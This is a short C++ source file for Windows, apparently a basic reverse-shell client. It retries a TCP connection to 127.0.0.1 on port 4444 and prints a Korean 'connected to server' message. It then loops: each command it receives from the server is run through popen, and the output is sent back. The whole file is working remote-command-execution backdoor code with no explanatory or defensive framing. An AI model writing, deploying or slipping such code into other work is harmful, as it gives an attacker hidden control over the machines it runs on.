#include <iostream>
#include <winsock2.h>
using namespace std;

int PORT = 4444;
#define PACKET_SIZE 1024
string SERVER_IP="127.0.0.1";

int main(){
WSADATA wsa;
WSAStartup(MAKEWORD(2,2),&wsa);

SOCKET skt;
skt = socket(PF_INET,SOCK_STREAM,IPPROTO_TCP);

SOCKADDR_IN addr = {};
addr.sin_family = AF_INET;
addr.sin_port = htons(PORT);
addr.sin_addr.s_addr = inet_addr(SERVER_IP.c_str());

while(1)
if(!connect(skt, (SOCKADDR*)&addr,sizeof(addr))) break;

char buff[PACKET_SIZE] = {0},rev[10000] = {0};
cout << "서버에 접속함(IP >> " << inet_ntoa(addr.sin_addr) << ")" << endl;
while(!WSAGetLastError()){
system("cls");
ZeroMemory(buff,PACKET_SIZE);
ZeroMemory(rev,10000);
recv(skt,buff,PACKET_SIZE,0);
FILE *fp = popen(buff, "r");
while(fgets(buff, PACKET_SIZE, fp) != NULL) strcat(rev,buff);
pclose(fp);
send(skt,rev,sizeof(rev),0);
}
closesocket(skt);
WSACleanup();
}
